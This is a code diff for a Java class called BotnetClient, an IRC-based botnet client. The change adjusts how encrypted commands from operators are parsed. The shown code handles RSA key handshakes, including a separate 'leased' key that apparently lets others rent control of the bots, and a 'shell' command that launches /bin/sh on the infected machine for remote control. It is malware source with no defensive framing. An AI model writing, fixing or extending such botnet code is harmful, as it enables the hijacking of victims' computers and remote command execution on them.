@@ -269,21 +269,21 @@ public class BotnetClient extends PircBot {
 					String command = chat.readLine();
 					String commandRSA = m.decryptRSA(command);
 					String leasedCommandRSA = leasedM.decryptRSA(command);
-					if (commandRSA.equalsIgnoreCase("key")) {
+					if (commandRSA.startsWith("key")) {
 						String otherKey = m.decryptRSA(chat.readLine());
 						String info = m.decryptRSA(chat.readLine());
 						m.setPubParams(info);
 						m.handShake(otherKey);
 						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
 						chat.close();
-					} else if (leasedCommandRSA.equalsIgnoreCase("key")) {
+					} else if (leasedCommandRSA.startsWith("key")) {
 						String otherKey = leasedM.decryptRSA(chat.readLine());
 						String info = leasedM.decryptRSA(chat.readLine());
 						leasedM.setPubParams(info);
 						leasedM.handShake(otherKey);
 						chat.sendLine(leasedM.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
 						chat.close();
-					} else if (m.decryptMsg(command).equalsIgnoreCase("shell")) {
+					} else if (commandRSA.equalsIgnoreCase("shell")) {
 						//Create the bash shell
 						Runtime r = Runtime.getRuntime();
 						Process p = r.exec("/bin/sh");
